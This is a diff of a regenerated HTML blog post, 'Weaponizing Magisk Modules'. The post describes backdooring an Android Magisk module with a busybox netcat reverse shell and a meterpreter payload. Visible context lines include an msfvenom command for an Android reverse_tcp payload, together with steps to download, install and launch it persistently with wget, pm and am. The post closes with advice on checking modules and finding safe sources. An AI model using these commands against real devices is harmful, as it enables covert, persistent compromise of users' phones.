@@ -2,23 +2,23 @@
 <html lang="en" class="h-full">
 <head>
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-6E5Q6YSW8D"></script>
-    <script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-6E5Q6YSW8D');</script>
+    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-6E5Q6YSW8D');</script>
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/retype">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.0.3.740233920480">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.1.0.744273604543">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.0.3">
+    <meta name="generator" content="Retype 3.1.0">
 
     <!-- Primary Meta Tags -->
     <title>Weaponizing Magisk Modules</title>
     <meta name="title" content="Weaponizing Magisk Modules">
-    <meta name="description" content="For Educational purpose only. Spreading Malware is a violation of the law, so please don't create and send any malware using the tactics discussed..." />
+    <meta name="description" content="For Educational purpose only. Spreading Malware is a violation of the law, so please don't create and send any malware using the tactics discussed...">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://nxb1t.github.io/retype/threat-intelligence/magisk_modules/" />
+    <link rel="canonical" href="https://nxb1t.github.io/retype/threat-intelligence/magisk_modules/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
@@ -34,23 +34,23 @@
     <meta property="twitter:description" content="For Educational purpose only. Spreading Malware is a violation of the law, so please don't create and send any malware using the tactics discussed...">
     <meta property="twitter:image" content="https://nxb1t.github.io/retype/assets/img/magisk_modules/magiskcover.jpg">
 
-    <script>(function () { var el = document.documentElement, m = localStorage.getItem("/retype/doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("/retype/doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../favicon.ico" rel="icon" />
-    <link href="../../resources/css/retype.css?v=3.0.3.740233920480" rel="stylesheet" />
+    <link href="../../favicon.ico" rel="icon">
+    <link href="../../resources/css/retype.css?v=3.1.0.744273604543" rel="stylesheet">
 
-    <script type="text/javascript" src="../../resources/js/config.js?v=3.0.3.740233920480" data-turbo-eval="false" defer></script>
-    <script type="text/javascript" src="../../resources/js/retype.js?v=3.0.3" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../../resources/js/lunr.js?v=3.0.3.740233920480" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../resources/js/prism.js?v=3.0.3.740233920480" defer></script>
-    <script id="mermaid-js" type="text/javascript" src="../../resources/js/mermaid.js?v=3.0.3" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.1.0.744273604543" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.1.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.1.0.744273604543" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.1.0.744273604543" defer></script>
+    <script id="mermaid-js" data-cfasync="false" src="../../resources/js/mermaid.js?v=3.1.0" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
         <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
     
         <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
-            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
                 <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                 <div v-cloak id="docs-sidebar-toggle"></div>
@@ -112,7 +112,7 @@
                             </li>
                             <li class="mr-6">
                                 <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://infosec.exchange/@nxb1t" target="_blank">
-                                    <img class="mb-px mr-1" width="18" alt="" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/24/null/external-mastodon-is-an-online-self-hosted-social-media-and-social-networking-service-logo-color-tal-revivo.png" />
+                                    <img class="mb-px mr-1" width="18" alt="" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/24/null/external-mastodon-is-an-online-self-hosted-social-media-and-social-networking-service-logo-color-tal-revivo.png">
                                     <span>Mastodon</span>
                                 </a>
                             </li>
@@ -136,24 +136,22 @@
                         <!-- Search input mock -->
                         <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
-                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-        
-                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
-                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
-                        <!-- Mobile search button mock -->
+                        <!-- Mobile search button -->
                         <div class="flex items-center justify-center w-10 h-10 lg:hidden">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                         </div>
         
-                        <!-- Dark mode switch placehokder -->
+                        <!-- Dark mode switch placeholder -->
                         <div class="w-10 h-10 lg:ml-2"></div>
         
-                        <!-- History button mock -->
+                        <!-- History button -->
                         <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                         </div>
                     </div>
         
@@ -174,10 +172,10 @@
             
                 <!-- Render this div, if config.showSidebarFilter is `true` -->
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                 </div>
             
-                <div class="pl-6 mb-4 mt-1">
+                <div class="pl-6 mt-1 mb-4">
                     <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                     <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                     <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
@@ -244,7 +242,7 @@
                                     </li>
                                     <li class="mr-6">
                                         <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://infosec.exchange/@nxb1t" target="_blank">
-                                            <img class="mb-px mr-1" width="18" alt="" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/24/null/external-mastodon-is-an-online-self-hosted-social-media-and-social-networking-service-logo-color-tal-revivo.png" />
+                                            <img class="mb-px mr-1" width="18" alt="" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/24/null/external-mastodon-is-an-online-self-hosted-social-media-and-social-networking-service-logo-color-tal-revivo.png">
                                             <span>Mastodon</span>
                                         </a>
                                     </li>
@@ -292,7 +290,7 @@
         <div>By</div>
         <div class="ml-2 flex items-center">
           <div class="shrink-0 w-8 h-8 overflow-hidden rounded-full">
-            <img class="object-cover" src="https://nxb1t.is-a.dev/assets/img/profile.jpeg"/>
+            <img class="object-cover" src="https://nxb1t.is-a.dev/assets/img/profile.jpeg">
           </div>
           <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">nxb1t</div>
         </div>
@@ -306,7 +304,7 @@
 </div>
 
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magiskcover.jpg" alt="" />
+    <img src="../../assets/img/magisk_modules/magiskcover.jpg" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -316,7 +314,7 @@
         <span>Introduction</span>
     </h2>
 </doc-anchor-target>
-<hr />
+<hr>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-yellow-500"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -347,7 +345,7 @@ I am an android enthusiast who loves rooting and modifying android devices. Magi
         <span>Magisk module</span>
     </h2>
 </doc-anchor-target>
-<hr />
+<hr>
 <p>One of the main features of Magisk is its module system, which allows users to automate most tasks by simply flashing a zip file. For example, the previously mentioned features, such as changing fonts, sounds, bootanimations requires typing many commands. But by creating a Magisk module, we can automate all this process with little to no user interaction.</p>
 <doc-anchor-target id="magisk-module-structure">
     <h3>
@@ -398,7 +396,7 @@ I am an android enthusiast who loves rooting and modifying android devices. Magi
         <span>The Attack Scenario</span>
     </h2>
 </doc-anchor-target>
-<hr />
+<hr>
 <p>Attack Chain :-</p>
 <div class="overflow-hidden mb-6 py-4 dark:px-5 dark:bg-white rounded-md"><pre class="mermaid w-full">%%{init: {'theme' : 'forest'} }%%
 graph LR
@@ -427,7 +425,7 @@ graph LR
 <p>Unfortunately, Android doesn&#x27;t come with Netcat preinstalled, but thankfully Magisk ships with a complete Busybox binary that contains <code v-pre>nc</code> and other useful tools.</p>
 <p>This makes our task easier, the magisk busybox is located at : <code v-pre>/data/adb/magisk/busybox</code></p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_backdoor.png" alt="Backdoor script" />
+    <img src="../../assets/img/magisk_modules/magisk_backdoor.png" alt="Backdoor script">
     <figcaption class="caption">Backdoor script</figcaption>
 </figure>
 </p>
@@ -439,7 +437,7 @@ graph LR
 </doc-anchor-target>
 <p>The repo had a build script named <code v-pre>build.sh</code>, this script automates the entire build process.</p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_build_module.png" alt="Module built successfuly" />
+    <img src="../../assets/img/magisk_modules/magisk_build_module.png" alt="Module built successfuly">
     <figcaption class="caption">Module built successfuly</figcaption>
 </figure>
 </p>
@@ -452,18 +450,18 @@ graph LR
 </doc-anchor-target>
 <p>For convenience, I renamed the module zip to <code v-pre>acc_backdoored.zip</code> and pushed it to Downloads folder using adb.</p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_adb_push.png" alt="Push the module to device" />
+    <img src="../../assets/img/magisk_modules/magisk_adb_push.png" alt="Push the module to device">
     <figcaption class="caption">Push the module to device</figcaption>
 </figure>
 </p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_zip.jpg" alt="Module zip file" />
+    <img src="../../assets/img/magisk_modules/magisk_zip.jpg" alt="Module zip file">
     <figcaption class="caption">Module zip file</figcaption>
 </figure>
 </p>
 <p>Pheww, No errors, installation successful.</p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_module_install.jpg" alt="Installation Success" />
+    <img src="../../assets/img/magisk_modules/magisk_module_install.jpg" alt="Installation Success">
     <figcaption class="caption">Installation Success</figcaption>
 </figure>
 </p>
@@ -474,7 +472,7 @@ graph LR
     </h3>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg" alt="" />
+    <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -502,7 +500,7 @@ graph LR
 <pre class="language-none"><code v-pre class="language-none">msfvenom -p android/meterpreter/reverse_tcp LPORT=192.168.43.22 LPORT=4444 &gt; evil.apk </code></pre>
 </doc-codeblock></div>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_exploit_env.png" alt="Reverse shell connected" />
+    <img src="../../assets/img/magisk_modules/magisk_exploit_env.png" alt="Reverse shell connected">
     <figcaption class="caption">Reverse shell connected</figcaption>
 </figure>
 </p>
@@ -514,7 +512,7 @@ graph LR
 </doc-anchor-target>
 <p>We need to download the payload in the target device, again android doesn&#x27;t come with curl, wget or similar tools.  But since we are in the magisk busybox environment, we can use <code v-pre>wget</code> to download the payload apk. We can then install the <code v-pre>evil.apk</code> using the <code v-pre>pm</code> command, which is the core of the conventional Apk Installer system.</p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_exploit_down.png" alt="Downloading meterpreter" />
+    <img src="../../assets/img/magisk_modules/magisk_exploit_down.png" alt="Downloading meterpreter">
     <figcaption class="caption">Downloading meterpreter</figcaption>
 </figure>
 </p>
@@ -552,7 +550,7 @@ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity</code></pre>
 <p>The <code v-pre>am</code> (Activity manager) is used to start the MainActivity of our meterpreter payload.</p>
 <p>Finally we got the meterpreter shell. This shell is persistent, whenever the user reboot their device both the <code v-pre>nc</code> reverse shell and meterpreter is loaded. All we need to do is keep the listener open.</p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_exploit_success.png" alt="Meterpreter Success" />
+    <img src="../../assets/img/magisk_modules/magisk_exploit_success.png" alt="Meterpreter Success">
     <figcaption class="caption">Meterpreter Success</figcaption>
 </figure>
 </p>
@@ -562,10 +560,10 @@ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity</code></pre>
         <span>Assessing the Malicious module</span>
     </h2>
 </doc-anchor-target>
-<hr />
+<hr>
 <p>Assessing module is pretty easy, we just need to extract the module zip file. Since our example module only have shell scripts, it won&#x27;t be hard to detect. But like I said before, with magisk modules we can change system files, which includes libraries, binaries etc. So finding malicious binaries and libraries would be quite hard and would require great reversing skills.</p>
 <p><figure class="content-center">
-    <img src="../../assets/img/magisk_modules/magisk_module_struct.png" alt="" />
+    <img src="../../assets/img/magisk_modules/magisk_module_struct.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -575,7 +573,7 @@ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity</code></pre>
         <span>Reliable sources for downloading Magisk modules</span>
     </h2>
 </doc-anchor-target>
-<hr />
+<hr>
 <p>This attack scenario could be real, As you can see there were literally no IOC a normal user can detect. Only chances would be, if the threat actor download all data, then the user can notice increased data usage and act accordingly. But if the attacker is patient enough, then everything will be compromised.</p>
 <p>So here are some reliable and safe places where you can download Magisk modules :-</p>
 <ul>
@@ -590,7 +588,7 @@ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity</code></pre>
         <span>Conclusion</span>
     </h2>
 </doc-anchor-target>
-<hr />
+<hr>
 <p>In conclusion, installing Magisk modules from unknown sources comes with a significant risk that cannot be ignored. Its better to install only essential modules than installing every module you see online. Also checking whats inside the module would be definitely a good practice, when its not from official module github repo and likewise.</p>
 
                                 <div class="flex items-center mt-6 mb-6 clear-both">
@@ -608,7 +606,7 @@ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity</code></pre>
                                 </div>
                 
                                 <!-- Required only on API pages -->
-                                <doc-toolbar-member-filter-no-results />
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
                             <footer class="clear-both">
                             
@@ -664,6 +662,6 @@ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script>window.__DOCS__ = { "title": "Weaponizing Magisk Modules", level: 2, icon: "file", hasPrism: true, hasMermaid: true, hasMath: false }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Weaponizing Magisk Modules", level: 2, icon: "file", hasPrism: true, hasMermaid: true, hasMath: false }</script>
 </body>
 </html>
